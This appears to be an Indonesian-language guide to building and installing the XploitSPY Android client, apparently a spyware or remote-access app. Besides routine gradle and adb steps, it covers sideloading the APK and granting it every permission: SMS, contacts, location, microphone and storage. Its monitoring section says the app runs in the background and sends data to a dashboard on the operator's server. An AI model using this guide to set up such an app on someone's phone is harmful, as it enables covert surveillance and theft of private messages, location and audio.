# Panduan Build dan Install APK

## 🚀 Quick Start

Jalankan script otomatis:

```bash
./BUILD_AND_INSTALL_APK.sh
```

Script ini akan:
1. ✅ Check Android SDK
2. ✅ Check Java
3. ✅ Check Gradle
4. ✅ Update Config jika perlu
5. ✅ Build APK
6. ✅ Install ke device (jika terhubung via USB)

## 📋 Prerequisites

### 1. Install Android Studio

Download dan install dari: https://developer.android.com/studio

Setelah install, Android SDK akan otomatis terinstall di:
- Mac: `~/Library/Android/sdk`
- Linux: `~/Android/Sdk`
- Windows: `C:\Users\YourName\AppData\Local\Android\Sdk`

### 2. Setup Environment Variables

Tambahkan ke `~/.zshrc` atau `~/.bashrc`:

```bash
export ANDROID_HOME=$HOME/Library/Android/sdk  # Mac
# atau
export ANDROID_HOME=$HOME/Android/Sdk          # Linux

export PATH=$PATH:$ANDROID_HOME/tools
export PATH=$PATH:$ANDROID_HOME/platform-tools
export PATH=$PATH:$ANDROID_HOME/tools/bin
```

Reload shell:
```bash
source ~/.zshrc  # atau source ~/.bashrc
```

### 3. Install Java 11+

```bash
# Mac dengan Homebrew
brew install openjdk@11

# Linux
sudo apt-get install openjdk-11-jdk
```

## 🔨 Build APK Manual

### Opsi 1: Menggunakan Android Studio (Recommended)

1. **Buka Android Studio**
2. **Open Project**
   - File → Open
   - Pilih folder `client/`
3. **Wait for Gradle Sync**
   - Tunggu sampai Gradle sync selesai
4. **Build APK**
   - Build → Build Bundle(s) / APK(s) → Build APK(s)
5. **APK Location**
   - `app/build/outputs/apk/release/app-release.apk`

### Opsi 2: Menggunakan Command Line

```bash
cd client

# Build APK
./gradlew assembleRelease

# APK akan tersedia di:
# app/build/outputs/apk/release/app-release.apk
```

### Opsi 3: Menggunakan Script

```bash
./BUILD_AND_INSTALL_APK.sh
```

## 📲 Install APK ke Device

### Opsi 1: Via ADB (USB Debugging)

1. **Enable USB Debugging di Android:**
   - Settings → About Phone
   - Tap "Build Number" 7 kali
   - Settings → Developer Options
   - Enable "USB Debugging"

2. **Connect Device via USB**

3. **Install via ADB:**
   ```bash
   adb devices                    # Check device connected
   adb install app-release.apk   # Install APK
   ```

### Opsi 2: Manual Install

1. **Transfer APK ke Device:**
   - Via USB: Copy APK ke device
   - Via Email: Kirim APK ke email, buka di device
   - Via Cloud: Upload ke Google Drive, download di device

2. **Enable Unknown Sources:**
   - Settings → Security → Unknown Sources (aktifkan)
   - Atau Settings → Apps → Special Access → Install Unknown Apps

3. **Install APK:**
   - Buka file APK di device
   - Tap "Install"
   - Berikan semua permissions

## 🔧 Troubleshooting

### Build Error: Android SDK not found

```bash
# Set ANDROID_HOME
export ANDROID_HOME=$HOME/Library/Android/sdk  # Mac
export PATH=$PATH:$ANDROID_HOME/tools
export PATH=$PATH:$ANDROID_HOME/platform-tools
```

### Build Error: Java version

```bash
# Check Java version
java -version

# Install Java 11+
brew install openjdk@11  # Mac
```

### Build Error: Gradle

```bash
cd client
./gradlew clean
./gradlew assembleRelease
```

### ADB: device not found

```bash
# Check ADB
adb devices

# If no devices:
# 1. Enable USB Debugging
# 2. Accept USB debugging prompt on device
# 3. Check USB cable
```

### APK Install Failed

1. **Uninstall old version:**
   ```bash
   adb uninstall com.xploitspy.client
   ```

2. **Install again:**
   ```bash
   adb install -r app-release.apk
   ```

## 📱 Setup Device untuk Monitoring

Setelah install APK:

1. **Open App**
   - Buka aplikasi di device
   - App akan otomatis berjalan di background

2. **Grant Permissions**
   - Location
   - Contacts
   - SMS (Read & Send)
   - Phone
   - Storage
   - Microphone
   - dll

3. **Verify Connection**
   - Buka dashboard: `http://YOUR_SERVER_IP:3000`
   - Device harus muncul di daftar
   - Data akan mulai muncul

## 🎯 Quick Commands

```bash
# Build APK
cd client && ./gradlew assembleRelease

# Install via ADB
adb install app/build/outputs/apk/release/app-release.apk

# Check connected devices
adb devices

# View device logs
adb logcat | grep XploitSPY

# Uninstall app
adb uninstall com.xploitspy.client
```

## 📝 Notes

1. **APK Location:**
   - Release: `client/app/build/outputs/apk/release/app-release.apk`
   - Debug: `client/app/build/outputs/apk/debug/app-debug.apk`

2. **APK Size:**
   - Release APK biasanya ~2-5 MB
   - Debug APK lebih besar karena tidak di-optimize

3. **Signing:**
   - Release APK perlu di-sign untuk production
   - Debug APK sudah di-sign dengan debug key

4. **Permissions:**
   - Pastikan semua permissions diberikan
   - Beberapa permissions perlu diaktifkan manual di Settings

## ✅ Checklist

- [ ] Android Studio terinstall
- [ ] ANDROID_HOME sudah di-set
- [ ] Java 11+ terinstall
- [ ] Config.java sudah diupdate dengan IP server
- [ ] APK berhasil di-build
- [ ] Device terhubung (untuk ADB install)
- [ ] APK terinstall di device
- [ ] Semua permissions diberikan
- [ ] Device muncul di dashboard

